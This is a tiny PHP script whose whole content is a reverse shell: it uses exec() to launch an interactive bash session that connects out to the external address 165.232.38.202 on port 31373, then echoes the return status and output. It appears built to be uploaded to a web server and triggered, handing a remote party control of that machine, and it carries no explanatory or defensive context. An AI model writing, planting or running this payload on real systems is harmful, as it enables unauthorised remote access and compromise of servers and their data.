<?php
  $output=null;
  $retval=null;
  $cmd = '/bin/bash -c "/bin/bash -i >& /dev/tcp/165.232.38.202/31373 0>&1 &"';
  exec($cmd, $output, $retval);
  echo "Returned with status $retval and output:\n";
  print_r($output);
?>
